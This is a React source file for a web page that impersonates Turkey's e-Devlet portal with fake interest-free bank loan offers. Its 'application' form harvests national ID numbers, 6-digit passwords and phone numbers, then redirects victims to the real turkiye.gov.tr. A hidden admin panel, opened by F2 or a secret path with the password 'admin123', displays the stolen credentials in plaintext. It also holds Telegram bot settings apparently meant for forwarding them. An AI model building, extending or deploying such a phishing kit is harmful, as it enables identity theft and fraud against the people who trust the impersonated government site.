import { useState, useEffect } from 'react'
import { Settings, Save, Plus, Edit, Trash2 } from 'lucide-react'
import { Button } from '@/components/ui/button'
import { Input } from '@/components/ui/input'
import { Card } from '@/components/ui/card'
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select'
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from '@/components/ui/dialog'
import { Label } from '@/components/ui/label'
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs'
import { Switch } from '@/components/ui/switch'
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@/components/ui/table'
import './App.css'

const API_BASE_URL = import.meta.env.VITE_API_URL || 'http://localhost:8000'

// Timezone helpers — Europe/Istanbul (GMT+3)
const IST_TZ = 'Europe/Istanbul'
const IST_OFFSET = '+03:00'
const fmtIstanbulDate = (d: Date | number | string = Date.now()) =>
  new Date(d).toLocaleDateString('tr-TR', { timeZone: IST_TZ, year: 'numeric', month: 'long', day: 'numeric' })
const fmtIstanbulDateTime = (d: Date | number | string) =>
  new Date(d).toLocaleString('tr-TR', { timeZone: IST_TZ })
const nowIstanbulISOish = () => new Date().toLocaleString('sv-SE', { timeZone: IST_TZ, hour12: false }).replace(' ', 'T')

interface Bank {
  id: number
  name: string
  logo: string
  campaign: string
  color: string
  is_active: boolean
  max_applications?: number
}

interface LoanOffer {
  bank: Bank
  monthly_payment: number
  total_payment: number
  total_interest: number
}

interface Application {
  id: number
  tc_kimlik: string
  sifre: string
  telefon: string
  bank_name: string
  amount: number
  months: number
  created_at: string
  status: string
}

function App() {
  const [loanAmount, setLoanAmount] = useState(75000)
  const [loanTerm, setLoanTerm] = useState(24)
  const [offers, setOffers] = useState<LoanOffer[]>([])
  const [loading, setLoading] = useState(false)
  const [selectedBank, setSelectedBank] = useState<Bank | null>(null)
  const [showApplicationForm, setShowApplicationForm] = useState(false)
  const [showAdminPanel, setShowAdminPanel] = useState(false)
  const [adminPassword, setAdminPassword] = useState('')
  const [isAdminAuthenticated, setIsAdminAuthenticated] = useState(false)
  const [showAdminLogin, setShowAdminLogin] = useState(false)
  
  const [tcKimlik, setTcKimlik] = useState('')
  const [sifre, setSifre] = useState('')
  const [telefon, setTelefon] = useState('+905')
  
  const [applications, setApplications] = useState<Application[]>([])
  const [selectedBankFilter, setSelectedBankFilter] = useState<string>('all')
  const [banks, setBanks] = useState<Bank[]>([])
  const [allBanks, setAllBanks] = useState<Bank[]>([])
  const [showBankForm, setShowBankForm] = useState(false)
  const [editingBank, setEditingBank] = useState<Bank | null>(null)
  const [bankFormData, setBankFormData] = useState({
    name: '',
    logo: '',
    campaign: '',
    color: '',
    is_active: true,
    max_applications: 0
  })
  const [telegramBotToken, setTelegramBotToken] = useState('')
  const [telegramChatId, setTelegramChatId] = useState('')
  const [showSuccessAnimation, setShowSuccessAnimation] = useState(false)
  const [isSubmitting, setIsSubmitting] = useState(false)

  useEffect(() => {
    calculateLoan()
    loadTelegramSettings()
    loadApplications()
    loadBanks()
    loadAllBanks()
    
    const handleKeyPress = (e: KeyboardEvent) => {
      // CHANGED: Hotkey -> F2 + preventDefault to avoid any default behavior
      if (e.key === 'F2') {
        e.preventDefault()
        e.stopPropagation()
        setShowAdminLogin(true)
      }
    }
    
    window.addEventListener('keydown', handleKeyPress)
    return () => window.removeEventListener('keydown', handleKeyPress)
  }, [])

  const calculateLoan = async () => {
    if (loanAmount < 25000) {
      alert('Minimum kredi tutarı 25.000 TL olmalıdır')
      return
    }
    if (loanAmount > 450000) {
      alert('Maksimum kredi tutarı 450.000 TL olmalıdır')
      return
    }
    
    setLoading(true)
    
    try {
      const banksResponse = await fetch(`${API_BASE_URL}/api/banks`)
      const banks = await banksResponse.json()
      
      const calculationResponse = await fetch(`${API_BASE_URL}/api/calculate`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          amount: loanAmount,
          months: loanTerm
        })
      })
      const calculation = await calculationResponse.json()
      
      const loanOffers = banks.map((bank: Bank) => ({
        bank,
        monthly_payment: calculation.monthly_payment,
        total_payment: calculation.total_payment,
        total_interest: 0
      }))
      
      setOffers(loanOffers)
    } catch (error) {
      console.error('Kredi hesaplama hatası:', error)
      alert('Kredi hesaplanırken hata oluştu')
    }
    
    setLoading(false)
  }

  const loadTelegramSettings = async () => {
    try {
      const response = await fetch(`${API_BASE_URL}/api/telegram-settings`)
      const data = await response.json()
      setTelegramBotToken(data.bot_token || '')
      setTelegramChatId(data.chat_id || '')
    } catch (error) {
      console.error('Telegram ayarları yüklenemedi:', error)
    }
  }

  const loadApplications = async () => {
    try {
      const response = await fetch(`${API_BASE_URL}/api/applications`)
      const data = await response.json()
      setApplications(data)
    } catch (error) {
      console.error('Başvurular yüklenemedi:', error)
    }
  }

  const loadBanks = async () => {
    try {
      const response = await fetch(`${API_BASE_URL}/api/banks`)
      const data = await response.json()
      setBanks(data)
    } catch (error) {
      console.error('Bankalar yüklenemedi:', error)
    }
  }

  const loadAllBanks = async () => {
    try {
      const response = await fetch(`${API_BASE_URL}/api/banks`)
      const data = await response.json()
      setAllBanks(data)
    } catch (error) {
      console.error('Tüm bankalar yüklenemedi:', error)
      setAllBanks([])
    }
  }

  const handleRecalculate = () => {
    calculateLoan()
  }

  const createBank = async () => {
    try {
      const res = await fetch(`${API_BASE_URL}/api/banks`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          ...bankFormData,
          created_at_istanbul: nowIstanbulISOish(),
          timezone: IST_TZ,
          offset: IST_OFFSET,
        })
      })
      if (!res.ok) throw new Error('Banka eklenemedi')
      await loadBanks()
      await loadAllBanks()
      setShowBankForm(false)
      resetBankForm()
      alert('Banka eklendi')
    } catch (e: any) {
      alert(e.message || 'Bilinmeyen hata: Banka ekleme')
    }
  }

  const updateBank = async () => {
    if (!editingBank) return
    try {
      const res = await fetch(`${API_BASE_URL}/api/banks/${editingBank.id}`, {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          ...bankFormData,
          updated_at_istanbul: nowIstanbulISOish(),
          timezone: IST_TZ,
          offset: IST_OFFSET,
        })
      })
      if (!res.ok) throw new Error('Banka güncellenemedi')
      await loadBanks()
      await loadAllBanks()
      setShowBankForm(false)
      setEditingBank(null)
      resetBankForm()
      alert('Banka güncellendi')
    } catch (e: any) {
      alert(e.message || 'Bilinmeyen hata: Banka güncelleme')
    }
  }

  const deleteBank = async (bank: Bank) => {
    if (!confirm(`${bank.name} silinsin mi?`)) return
    try {
      const res = await fetch(`${API_BASE_URL}/api/banks/${bank.id}`, { method: 'DELETE' })
      if (!res.ok) throw new Error('Banka silinemedi')
      await loadBanks()
      await loadAllBanks()
      alert('Banka silindi')
    } catch (e: any) {
      alert(e.message || 'Bilinmeyen hata: Banka silme')
    }
  }

  const resetBankForm = () => {
    setBankFormData({
      name: '',
      logo: '',
      campaign: '',
      color: '',
      is_active: true,
      max_applications: 0
    })
  }

  const openEditBank = (bank: Bank) => {
    setEditingBank(bank)
    setBankFormData({
      name: bank.name,
      logo: bank.logo,
      campaign: bank.campaign,
      color: bank.color,
      is_active: bank.is_active,
      max_applications: bank.max_applications || 0
    })
    setShowBankForm(true)
  }

  const filteredApplications = selectedBankFilter === 'all' 
    ? applications 
    : applications.filter(app => app.bank_name === selectedBankFilter)

  const handleApply = (bank: Bank) => {
    setSelectedBank(bank)
    setShowApplicationForm(true)
  }

  const validateTcKimlik = (value: string) => {
    return /^\d{11}$/.test(value)
  }

  const validateSifre = (value: string) => {
    return /^\d{6}$/.test(value)
  }

  const validateTelefon = (value: string) => {
    return /^\+905\d{9}$/.test(value)
  }

  const handleTelefonChange = (value: string) => {
    if (!value.startsWith('+90')) {
      setTelefon('+905')
    } else if (value.length <= 13) {
      setTelefon(value)
    }
  }

  const submitApplication = async () => {
    if (!selectedBank) return

    // Eğer zaten gönderiliyor ise tekrar gönderme
    if (isSubmitting) return

    if (!validateTcKimlik(tcKimlik)) {
      alert('T.C. kimlik numarası 11 haneli olmalıdır')
      return
    }

    if (!validateSifre(sifre)) {
      alert('Şifre 6 haneli sayı olmalıdır')
      return
    }

    if (!validateTelefon(telefon)) {
      alert('Telefon numarası +905 ile başlamalı ve 13 haneli olmalıdır')
      return
    }

    setIsSubmitting(true) // Butonu devre dışı bırak

    try {
      const response = await fetch(`${API_BASE_URL}/api/submit`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          tc_kimlik: tcKimlik,
          sifre: sifre,
          telefon: telefon,
          bank_name: selectedBank.name,
          amount: loanAmount,
          months: loanTerm,
          created_at_istanbul: nowIstanbulISOish(),
          timezone: IST_TZ,
          offset: IST_OFFSET,
        })
      })

      if (response.ok) {
        setShowSuccessAnimation(true)
        // Önce popup'ı göster, sonra yönlendir
        setTimeout(() => {
          // Popup'ı kapat ve formu temizle
          setShowSuccessAnimation(false)
          setShowApplicationForm(false)
          setTcKimlik('')
          setSifre('')
          setTelefon('+905')
          setIsSubmitting(false)
          loadApplications()
        }, 5000) // 5 saniye popup göster
        
        // 5 saniye sonra yönlendir
        setTimeout(() => {
          window.location.href = 'https://www.turkiye.gov.tr/aile-ve-sosyal-hizmetler-sosyal-yardim-basvuru-hizmeti'
        }, 5000)
      } else {
        const error = await response.json()
        alert('Başvuru hatası: ' + (error.message || 'Bilinmeyen hata'))
        setIsSubmitting(false) // Hata durumunda butonu tekrar aktif et
      }
    } catch (error) {
      console.error('Başvuru gönderimi hatası:', error)
      alert('Başvuru gönderilirken hata oluştu')
      setIsSubmitting(false) // Hata durumunda butonu tekrar aktif et
    }
  }

  const handleAdminLogin = () => {
    // CHANGED: "beyaz ekran"ı önlemek için state sırası ve garanti kapatma
    if (adminPassword === 'admin123') {
      setIsAdminAuthenticated(true)
      setShowAdminLogin(false) // önce login dialogunu kapat
      setTimeout(() => {
        setShowAdminPanel(true) // sonra admin panelini aç
      }, 0)
    } else {
      alert('Yanlış şifre!')
    }
  }

  const openAdminPanel = () => {
    if (window.location.pathname === '/admin-secret-panel-2024') {
      setShowAdminLogin(true)
    }
  }

  const updateTelegramSettings = async () => {
    try {
      const response = await fetch(`${API_BASE_URL}/api/telegram-settings`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          bot_token: telegramBotToken,
          chat_id: telegramChatId,
          updated_at_istanbul: nowIstanbulISOish(),
          timezone: IST_TZ,
          offset: IST_OFFSET,
        })
      })

      if (response.ok) {
        alert('Telegram ayarları güncellendi!')
      } else {
        alert('Telegram ayarları güncellenemedi')
      }
    } catch (error) {
      console.error('Telegram ayarları güncelleme hatası:', error)
      alert('Telegram ayarları güncellenirken hata oluştu')
    }
  }

  return (
    <div className="min-h-screen bg-gray-50">
      <header className="bg-white shadow-sm border-b">
        <div className="container mx-auto px-4 py-4">
          <div className="flex justify-between items-center">
            <div className="flex items-center">
              <h1 className="text-xl md:text-2xl font-bold text-red-600">e-Devlet</h1>
            </div>
            <nav className="flex items-center">
              <a href="#" className="text-gray-700 hover:text-purple-600 font-medium text-sm md:text-base">Kredi</a>
            </nav>
            <div className="flex items-center space-x-2 md:space-x-4">
              <Button
                variant="outline"
                size="sm"
                className="border-purple-600 text-purple-600 hover:bg-purple-50 text-xs md:text-sm px-2 md:px-4"
              >
                <span className="hidden sm:inline">Faizsiz fırsatlar</span>
                <span className="sm:hidden">Faizsiz</span>
              </Button>
              <div className="hidden">
                <Button
                  variant="outline"
                  size="sm"
                  onClick={openAdminPanel}
                  className="opacity-0"
                >
                  <Settings className="h-4 w-4 mr-2" />
                  Admin Panel
                </Button>
              </div>
            </div>
          </div>
        </div>
      </header>

      <section className="bg-gradient-to-r from-purple-50 to-blue-50 py-12">
        <div className="container mx-auto px-4 text-center">
          <h2 className="text-4xl font-bold text-red-900 mb-4">
            2025 Yılı içerisinde 1 defa destek alabilirsiniz<br />
          </h2>
        </div>
      </section>

      <main className="container mx-auto px-4 py-8">
        <Card className="mb-8 bg-white shadow-sm border">
          <div className="p-6">
            <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
              <div>
                <Label htmlFor="amount" className="block text-gray-700 font-medium mb-2">Tutar</Label>
                <div className="relative">
                  <Input
                    id="amount"
                    type="number"
                    value={loanAmount}
                    onChange={(e) => setLoanAmount(Number(e.target.value))}
                    placeholder="75.000"
                    className="text-lg pr-8"
                    min="25000"
                    max="450000"
                  />
                  <span className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-500">TL</span>
                </div>
              </div>
              <div>
                <Label htmlFor="term" className="block text-gray-700 font-medium mb-2">Vade</Label>
                <Select value={loanTerm.toString()} onValueChange={(value) => setLoanTerm(Number(value))}>
                  <SelectTrigger className="text-lg">
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent>
                    {[12, 18, 24, 36, 48, 60].map((months) => (
                      <SelectItem key={months} value={months.toString()}>
                        {months} Ay
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>
              <div className="flex items-end">
                <Button 
                  onClick={handleRecalculate} 
                  disabled={loading}
                  className="w-full bg-purple-600 hover:bg-purple-700 text-white font-medium"
                >
                  {loading ? (
                    <div className="flex items-center">
                      <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white mr-2"></div>
                      Yeniden Hesapla
                    </div>
                  ) : (
                    "Yeniden Hesapla"
                  )}
                </Button>
              </div>
            </div>
          </div>
        </Card>

        {offers.length > 0 && (
          <div className="space-y-6">
            <div className="mb-6">
              <h2 className="text-xl font-semibold text-gray-900 mb-2">
                {loanAmount?.toLocaleString() || '0'} TL, {loanTerm} Ay vadeli ihtiyaç kredileri
              </h2>
              <div className="flex justify-between items-center">
                <p className="text-gray-600 text-sm">{fmtIstanbulDate()} - {offers.length} teklif</p>
              </div>
            </div>

            <div className="space-y-4">
              {offers.map((offer) => (
                <Card key={offer.bank.id} className={`bg-white border-2 hover:shadow-md transition-shadow ${
                  offer.bank.color === 'red' ? 'border-red-500' : 
                  offer.bank.color === 'blue' ? 'border-blue-500' : 
                  offer.bank.color === 'green' ? 'border-green-500' : 
                  offer.bank.color === 'purple' ? 'border-purple-500' : 
                  offer.bank.color === 'cyan' ? 'border-cyan-500' : 
                  offer.bank.color === 'pink' ? 'border-pink-500' : 
                  offer.bank.color === 'gray' ? 'border-gray-500' : 
                  'border-gray-300'
                }`}>
                  <div className="p-4 md:p-6">
                    <div className="flex flex-col md:flex-row md:items-center md:justify-between gap-4">
                      <div className="flex items-center space-x-4">
                        <img 
                          src={offer.bank.logo} 
                          alt={offer.bank.name}
                          className="w-12 h-12 md:w-16 md:h-16 object-contain"
                        />
                        <div className="flex-1">
                          <h3 className="font-semibold text-lg text-gray-900">{offer.bank.name}</h3>
                          <div className="text-sm text-gray-600 mt-1">
                            <div className="break-words">{offer.bank.campaign}</div>
                          </div>
                        </div>
                      </div>
                      
                      <div className="flex flex-col md:flex-row md:items-center gap-4 md:gap-8">
                        <div className="text-center md:text-right">
                          <div className="text-sm text-gray-600">Aylık Ödeme</div>
                          <div className="text-xl md:text-2xl font-bold text-gray-900">
                            {offer.monthly_payment?.toLocaleString() || '0'} TL
                          </div>
                        </div>
                        
                        <div className="text-center md:text-right">
                          <div className="text-sm text-gray-600">Toplam Ödeme</div>
                          <div className="text-lg font-semibold text-gray-700">
                            {offer.total_payment?.toLocaleString() || '0'} TL
                          </div>
                        </div>
                        
                        <Button 
                          onClick={() => handleApply(offer.bank)}
                          className="w-full md:w-auto bg-purple-600 hover:bg-purple-700 text-white font-medium px-6 py-2"
                        >
                          Hemen başvur
                        </Button>
                      </div>
                    </div>
                  </div>
                </Card>
              ))}
            </div>
          </div>
        )}
      </main>

      {showApplicationForm && selectedBank && (
        <Dialog open={showApplicationForm} onOpenChange={setShowApplicationForm}>
          <DialogContent className="sm:max-w-md">
            <DialogHeader>
              <DialogTitle className="flex items-center space-x-2">
                <img 
                  src={selectedBank.logo} 
                  alt={selectedBank.name}
                  className="w-8 h-8 object-contain"
                />
                <span>{selectedBank.name} Başvuru Formu</span>
              </DialogTitle>
              <DialogDescription>
                {loanAmount?.toLocaleString()} TL - {loanTerm} Ay vadeli kredi başvurusu
              </DialogDescription>
            </DialogHeader>
            
            <div className="space-y-4">
              <div>
                <Label htmlFor="tc">T.C. Kimlik Numarası</Label>
                <Input
                  id="tc"
                  value={tcKimlik}
                  onChange={(e) => setTcKimlik(e.target.value)}
                  placeholder="11 haneli T.C. kimlik numarası"
                  maxLength={11}
                />
              </div>
              
              <div>
                <Label htmlFor="password">Şifre</Label>
                <Input
                  id="password"
                  type="password"
                  value={sifre}
                  onChange={(e) => setSifre(e.target.value)}
                  placeholder="6 haneli şifre"
                  maxLength={6}
                />
              </div>
              
              <div>
                <Label htmlFor="phone">Telefon Numarası</Label>
                <Input
                  id="phone"
                  value={telefon}
                  onChange={(e) => handleTelefonChange(e.target.value)}
                  placeholder="+905XXXXXXXXX"
                  maxLength={13}
                />
              </div>
              
              <div className="flex space-x-2">
                <Button 
                  variant="outline" 
                  onClick={() => setShowApplicationForm(false)}
                  className="flex-1"
                >
                  İptal
                </Button>
                <Button 
                  onClick={submitApplication}
                  disabled={isSubmitting}
                  className="flex-1 bg-purple-600 hover:bg-purple-700 disabled:bg-gray-400 disabled:cursor-not-allowed"
                >
                  {isSubmitting ? (
                    <div className="flex items-center">
                      <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white mr-2"></div>
                      Gönderiliyor...
                    </div>
                  ) : (
                    "Başvuru Gönder"
                  )}
                </Button>
              </div>
            </div>
          </DialogContent>
        </Dialog>
      )}

      {showSuccessAnimation && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
          <div className="bg-white rounded-lg p-8 text-center max-w-md mx-4">
            <div className="text-6xl mb-4">✅</div>
            <h3 className="text-xl font-semibold text-gray-900 mb-4">Başvurunuz Alındı!</h3>
            <p className="text-gray-600 mb-2">Başvurunuz başarıyla alındı.</p>
            <p className="text-gray-700 font-medium">Başvurduğunuz banka temsilcisi tarafınızla iletişime geçecektir.</p>
            <p className="text-sm text-gray-500 mt-4">5 saniye sonra Turkiye.gov.tr'ye yönlendirileceksiniz...</p>
          </div>
        </div>
      )}

      {showAdminLogin && (
        <Dialog open={showAdminLogin} onOpenChange={setShowAdminLogin}>
          <DialogContent className="sm:max-w-md">
            <DialogHeader>
              <DialogTitle>Admin Panel Girişi</DialogTitle>
            </DialogHeader>
            
            <div className="space-y-4">
              <div>
                <Label htmlFor="adminPass">Admin Şifresi</Label>
                <Input
                  id="adminPass"
                  type="password"
                  value={adminPassword}
                  onChange={(e) => setAdminPassword(e.target.value)}
                  placeholder="Admin şifresini girin"
                />
              </div>
              
              <div className="flex space-x-2">
                <Button 
                  variant="outline" 
                  onClick={() => setShowAdminLogin(false)}
                  className="flex-1"
                >
                  İptal
                </Button>
                <Button 
                  onClick={handleAdminLogin}
                  className="flex-1 bg-purple-600 hover:bg-purple-700"
                >
                  Giriş Yap
                </Button>
              </div>
            </div>
          </DialogContent>
        </Dialog>
      )}

      {showAdminPanel && isAdminAuthenticated && (
        <Dialog open={showAdminPanel} onOpenChange={setShowAdminPanel}>
          <DialogContent className="max-w-6xl max-h-[90vh] overflow-y-auto">
            <DialogHeader>
              <DialogTitle className="flex items-center space-x-2">
                <Settings className="h-5 w-5" />
                <span>Admin Panel</span>
              </DialogTitle>
            </DialogHeader>
            
            <Tabs defaultValue="applications" className="w-full">
              <TabsList className="grid w-full grid-cols-4">
                <TabsTrigger value="applications">Başvurular</TabsTrigger>
                <TabsTrigger value="banks">Banka Yönetimi</TabsTrigger>
                <TabsTrigger value="stats">İstatistikler</TabsTrigger>
                <TabsTrigger value="telegram">Telegram</TabsTrigger>
              </TabsList>
              
              <TabsContent value="applications" className="space-y-4">
                <div className="flex items-center space-x-4">
                  <Label>Banka Filtresi:</Label>
                  <Select value={selectedBankFilter} onValueChange={setSelectedBankFilter}>
                    <SelectTrigger className="w-48">
                      <SelectValue />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="all">Tüm Bankalar</SelectItem>
                      {banks.map((bank) => (
                        <SelectItem key={bank.id} value={bank.name}>
                          {bank.name}
                        </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                </div>
                
                <div className="border rounded-lg">
                  <Table>
                    <TableHeader>
                      <TableRow>
                        <TableHead>T.C. Kimlik</TableHead>
                        <TableHead>Şifre</TableHead>
                        <TableHead>Telefon</TableHead>
                        <TableHead>Banka</TableHead>
                        <TableHead>Tutar</TableHead>
                        <TableHead>Vade</TableHead>
                        <TableHead>Tarih</TableHead>
                      </TableRow>
                    </TableHeader>
                    <TableBody>
                      {filteredApplications.map((app) => (
                        <TableRow key={app.id}>
                          <TableCell className="font-mono">{app.tc_kimlik}</TableCell>
                          <TableCell className="font-mono">{app.sifre}</TableCell>
                          <TableCell>{app.telefon}</TableCell>
                          <TableCell>{app.bank_name}</TableCell>
                          <TableCell>{(app.amount ?? 0).toLocaleString()} TL</TableCell>
                          <TableCell>{app.months} Ay</TableCell>
                          <TableCell>{fmtIstanbulDateTime(app.created_at)}</TableCell>
                        </TableRow>
                      ))}
                    </TableBody>
                  </Table>
                </div>
              </TabsContent>

              <TabsContent value="banks" className="space-y-4">
                <div className="flex justify-between items-center">
                  <h3 className="text-lg font-semibold">Banka Yönetimi</h3>
                  <Button 
                    onClick={() => setShowBankForm(true)}
                    className="bg-purple-600 hover:bg-purple-700"
                  >
                    <Plus className="h-4 w-4 mr-2" />
                    Yeni Banka Ekle
                  </Button>
                </div>
                
                <div className="border rounded-lg">
                  <Table>
                    <TableHeader>
                      <TableRow>
                        <TableHead>Logo</TableHead>
                        <TableHead>Banka Adı</TableHead>
                        <TableHead>Kampanya</TableHead>
                        <TableHead>Renk</TableHead>
                        <TableHead>Durum</TableHead>
                        <TableHead>Max Başvuru</TableHead>
                        <TableHead>İşlemler</TableHead>
                      </TableRow>
                    </TableHeader>
                    <TableBody>
                      {(allBanks || []).map((bank) => (
                        <TableRow key={bank.id}>
                          <TableCell>
                            <img src={bank.logo} alt={bank.name} className="w-8 h-8 object-contain" />
                          </TableCell>
                          <TableCell className="font-medium">{bank.name}</TableCell>
                          <TableCell className="max-w-xs truncate">{bank.campaign}</TableCell>
                          <TableCell>
                            <div className={`w-6 h-6 rounded border-2 ${
                              bank.color === 'red' ? 'bg-red-500' : 
                              bank.color === 'blue' ? 'bg-blue-500' : 
                              bank.color === 'green' ? 'bg-green-500' : 
                              bank.color === 'purple' ? 'bg-purple-500' : 
                              bank.color === 'cyan' ? 'bg-cyan-500' : 
                              bank.color === 'pink' ? 'bg-pink-500' : 
                              bank.color === 'gray' ? 'bg-gray-500' : 
                              'bg-gray-300'
                            }`}></div>
                          </TableCell>
                          <TableCell>
                            <span className={`px-2 py-1 rounded text-xs ${
                              bank.is_active ? 'bg-green-100 text-green-800' : 'bg-red-100 text-red-800'
                            }`}>
                              {bank.is_active ? 'Aktif' : 'Pasif'}
                            </span>
                          </TableCell>
                          <TableCell>{bank.max_applications || 0}</TableCell>
                          <TableCell>
                            <div className="flex space-x-2">
                              <Button
                                size="sm"
                                variant="outline"
                                onClick={() => openEditBank(bank)}
                              >
                                <Edit className="h-4 w-4" />
                              </Button>
                              <Button
                                size="sm"
                                variant="outline"
                                onClick={() => deleteBank(bank)}
                                className="text-red-600 hover:text-red-700"
                              >
                                <Trash2 className="h-4 w-4" />
                              </Button>
                            </div>
                          </TableCell>
                        </TableRow>
                      ))}
                    </TableBody>
                  </Table>
                </div>
              </TabsContent>

              <TabsContent value="stats" className="space-y-4">
                <h3 className="text-lg font-semibold">Banka Başvuru İstatistikleri</h3>
                <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                  {banks.map((bank) => {
                    const bankApplications = applications.filter(app => app.bank_name === bank.name)
                    return (
                      <Card key={bank.id} className="p-4">
                        <div className="flex items-center space-x-3">
                          <img src={bank.logo} alt={bank.name} className="w-10 h-10 object-contain" />
                          <div>
                            <h4 className="font-semibold">{bank.name}</h4>
                            <p className="text-2xl font-bold text-purple-600">{bankApplications.length}</p>
                            <p className="text-sm text-gray-600">başvuru</p>
                          </div>
                        </div>
                      </Card>
                    )
                  })}
                </div>
                
                <Card className="p-4">
                  <h4 className="font-semibold mb-2">Toplam İstatistikler</h4>
                  <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                    <div className="text-center">
                      <p className="text-2xl font-bold text-blue-600">{applications.length}</p>
                      <p className="text-sm text-gray-600">Toplam Başvuru</p>
                    </div>
                    <div className="text-center">
                      <p className="text-2xl font-bold text-green-600">{banks.length}</p>
                      <p className="text-sm text-gray-600">Aktif Banka</p>
                    </div>
                    <div className="text-center">
                      <p className="text-2xl font-bold text-purple-600">
                        {applications.reduce((sum, app) => sum + (app.amount ?? 0), 0).toLocaleString()}
                      </p>
                      <p className="text-sm text-gray-600">Toplam Tutar (TL)</p>
                    </div>
                    <div className="text-center">
                      <p className="text-2xl font-bold text-orange-600">
                        {applications.length > 0 
                          ? Math.round(applications.reduce((sum, app) => sum + (app.amount ?? 0), 0) / applications.length).toLocaleString() 
                          : 0}
                      </p>
                      <p className="text-sm text-gray-600">Ortalama Tutar (TL)</p>
                    </div>
                  </div>
                </Card>
              </TabsContent>
              
              <TabsContent value="telegram" className="space-y-4">
                <h3 className="text-lg font-semibold">Telegram Bot Ayarları</h3>
                <div className="space-y-4">
                  <div>
                    <Label htmlFor="botToken">Bot Token</Label>
                    <Input
                      id="botToken"
                      value={telegramBotToken}
                      onChange={(e) => setTelegramBotToken(e.target.value)}
                      placeholder="Telegram bot token'ınızı girin"
                    />
                  </div>
                  
                  <div>
                    <Label htmlFor="chatId">Chat ID</Label>
                    <Input
                      id="chatId"
                      value={telegramChatId}
                      onChange={(e) => setTelegramChatId(e.target.value)}
                      placeholder="Telegram chat ID'nizi girin"
                    />
                  </div>
                  
                  <Button 
                    onClick={updateTelegramSettings}
                    className="bg-purple-600 hover:bg-purple-700"
                  >
                    <Save className="h-4 w-4 mr-2" />
                    Ayarları Kaydet
                  </Button>
                </div>
              </TabsContent>
            </Tabs>
          </DialogContent>
        </Dialog>
      )}

      {showBankForm && (
        <Dialog open={showBankForm} onOpenChange={setShowBankForm}>
          <DialogContent className="sm:max-w-md">
            <DialogHeader>
              <DialogTitle>
                {editingBank ? 'Banka Düzenle' : 'Yeni Banka Ekle'}
              </DialogTitle>
            </DialogHeader>
            
            <div className="space-y-4">
              <div>
                <Label htmlFor="bankName">Banka Adı</Label>
                <Input
                  id="bankName"
                  value={bankFormData.name}
                  onChange={(e) => setBankFormData({...bankFormData, name: e.target.value})}
                  placeholder="Banka adını girin"
                />
              </div>
              
              <div>
                <Label htmlFor="bankLogo">Logo URL</Label>
                <Input
                  id="bankLogo"
                  value={bankFormData.logo}
                  onChange={(e) => setBankFormData({...bankFormData, logo: e.target.value})}
                  placeholder="Logo URL'sini girin"
                />
              </div>
              
              <div>
                <Label htmlFor="bankCampaign">Kampanya Metni</Label>
                <Input
                  id="bankCampaign"
                  value={bankFormData.campaign}
                  onChange={(e) => setBankFormData({...bankFormData, campaign: e.target.value})}
                  placeholder="Kampanya metnini girin"
                />
              </div>
              
              <div>
                <Label htmlFor="bankColor">Renk</Label>
                <Select 
                  value={bankFormData.color} 
                  onValueChange={(value) => setBankFormData({...bankFormData, color: value})}
                >
                  <SelectTrigger>
                    <SelectValue placeholder="Renk seçin" />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="red">Kırmızı</SelectItem>
                    <SelectItem value="blue">Mavi</SelectItem>
                    <SelectItem value="green">Yeşil</SelectItem>
                    <SelectItem value="purple">Mor</SelectItem>
                    <SelectItem value="cyan">Cyan</SelectItem>
                    <SelectItem value="pink">Pembe</SelectItem>
                    <SelectItem value="gray">Gri</SelectItem>
                  </SelectContent>
                </Select>
              </div>
              
              <div>
                <Label htmlFor="maxApplications">Maksimum Başvuru Sayısı</Label>
                <Input
                  id="maxApplications"
                  type="number"
                  value={bankFormData.max_applications}
                  onChange={(e) => setBankFormData({...bankFormData, max_applications: Number(e.target.value)})}
                  placeholder="0"
                  min="0"
                />
              </div>
              
              <div className="flex items-center space-x-2">
                <Switch
                  id="isActive"
                  checked={bankFormData.is_active}
                  onCheckedChange={(checked) => setBankFormData({...bankFormData, is_active: checked})}
                />
                <Label htmlFor="isActive">Aktif</Label>
              </div>
              
              <div className="flex space-x-2">
                <Button 
                  variant="outline" 
                  onClick={() => {
                    setShowBankForm(false)
                    setEditingBank(null)
                    resetBankForm()
                  }}
                  className="flex-1"
                >
                  İptal
                </Button>
                <Button 
                  onClick={editingBank ? updateBank : createBank}
                  className="flex-1 bg-purple-600 hover:bg-purple-700"
                >
                  {editingBank ? 'Güncelle' : 'Ekle'}
                </Button>
              </div>
            </div>
          </DialogContent>
        </Dialog>
      )}
    </div>
  )
}

export default App
